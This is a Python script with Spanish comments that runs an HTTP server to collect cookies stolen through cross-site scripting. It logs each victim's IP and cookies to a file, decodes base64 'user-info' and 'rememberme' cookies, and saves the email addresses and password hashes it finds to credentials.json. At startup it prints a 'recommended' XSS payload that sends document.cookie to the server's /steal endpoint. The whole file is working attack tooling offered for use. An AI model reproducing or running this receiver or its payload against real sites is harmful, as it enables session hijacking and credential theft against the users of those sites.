#!/usr/bin/env python3
"""
SERVIDOR RECEPTOR DE COOKIES
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import datetime
import base64
import json
import re

class CookieReceiver(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Manejar peticiones GET con cookies en query string"""
        try:
            parsed_url = urlparse(self.path)
            query = parsed_url.query
            
            cookies_raw = self._extract_param(query, ['cookies', 'c'])
            
            if cookies_raw:
                print("\n" + "="*70)
                print(f"COOKIES CAPTURADAS - {datetime.datetime.now()}")
                print("="*70)
                print(f"IP: {self.client_address[0]}")
                print(f"Cookies: {cookies_raw}")
                print("="*70)
                
                # Intentar decodificar si es Base64
                self._try_decode(cookies_raw)
                
                # Guardar en archivo
                with open('cookies_captured.txt', 'a') as f:
                    f.write(f"\n[{datetime.datetime.now()}]\n")
                    f.write(f"{cookies_raw}\n")
                    f.write("="*70 + "\n")
            
            self._send_ok()
            
        except Exception as e:
            print(f"Error: {e}")
            self._send_ok()
    
    def _extract_param(self, data, names):
        """Extraer parametro de query string sin alterar '+' """
        if not data:
            return None
        for part in data.split('&'):
            if '=' in part:
                key, val = part.split('=', 1)
                if key in names:
                    # Decodificar %XX pero mantener '+'
                    from urllib.parse import unquote
                    return unquote(val)
        return None
    
    def _try_decode(self, cookie_value):
        """Intentar decodificar Base64 y extraer datos"""
        try:
            # Separar cookies individuales
            for cookie in cookie_value.split(';'):
                cookie = cookie.strip()
                if '=' not in cookie:
                    continue
                    
                name, value = cookie.split('=', 1)
                print(f"\nCookie: {name}")
                print(f"Longitud: {len(value)}")
                
                # Intentar decodificar Base64
                if name.lower() in ['user-info', 'rememberme']:
                    try:
                        decoded = base64.b64decode(value)
                        xml = decoded.decode('utf-8', errors='ignore')
                        
                        print("\nContenido XML decodificado:")
                        print(xml[:500])
                        
                        # Extraer email y hash
                        strings = re.findall(r'<string>(.*?)</string>', xml)
                        if len(strings) >= 2:
                            print(f"\nEMAIL: {strings[0]}")
                            print(f"HASH:  {strings[1]}")
                            
                            # Guardar credenciales
                            with open('credentials.json', 'a') as f:
                                data = {
                                    'timestamp': str(datetime.datetime.now()),
                                    'email': strings[0],
                                    'hash': strings[1]
                                }
                                f.write(json.dumps(data, indent=2) + '\n')
                            print("\nCredenciales guardadas en credentials.json")
                            
                    except Exception as e:
                        print(f"No se pudo decodificar: {e}")
        except Exception as e:
            print(f"Error analizando: {e}")
    
    def _send_ok(self):
        """Enviar respuesta OK con CORS"""
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_OPTIONS(self):
        """Manejar preflight CORS"""
        self._send_ok()
    
    def log_message(self, format, *args):
        """Silenciar logs HTTP"""
        pass


def main():
    host = '0.0.0.0'
    port = 8000
    
    print("="*70)
    print("SERVIDOR RECEPTOR DE COOKIES")
    print("="*70)
    print(f"\nServidor en http://{host}:{port}")
    print("\nPayload XSS recomendado:")
    print('<img src=x onerror="fetch(\'http://localhost:8000/steal?cookies=\'+encodeURIComponent(document.cookie))">')
    print("\nEsperando cookies...")
    print("="*70)
    print()
    
    try:
        server = HTTPServer((host, port), CookieReceiver)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\nServidor detenido")


if __name__ == '__main__':
    main()
